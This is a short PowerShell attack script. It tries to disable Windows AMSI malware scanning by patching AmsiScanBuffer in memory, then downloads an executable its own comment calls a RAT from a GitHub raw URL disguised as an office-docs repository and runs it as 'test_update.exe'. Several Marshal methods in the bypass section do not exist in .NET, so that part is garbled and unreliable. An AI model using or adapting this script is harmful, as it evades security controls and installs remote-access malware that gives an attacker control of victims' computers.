# AMSI Bypass - Patch AmsiScanBuffer to always return S_OK
try {
    $amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionImpl(
        [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForName(
            [System.Runtime.InteropServices.Marshal]::LoadLibrary("amsi.dll"),
            "AmsiScanBuffer"),
        [System.Func[
            [System.IntPtr], [System.IntPtr], [System.UInt32], [System.IntPtr],
            [System.IntPtr], [System.IntPtr]]])

    # Patch AmsiScanBuffer to return S_OK (0)
    $patch = [byte[]]@(0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
    $addr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForName(
        [System.Runtime.InteropServices.Marshal]::LoadLibrary("amsi.dll"),
        "AmsiScanBuffer")
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
} catch {
    # AMSI bypass failed, continue anyway
}

# Download and execute RAT
$filePath = "C:\Users\ancho\Desktop\test_update.exe"
$url = "https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/update.exe"
Invoke-WebRequest -Uri $url -OutFile $filePath
& $filePath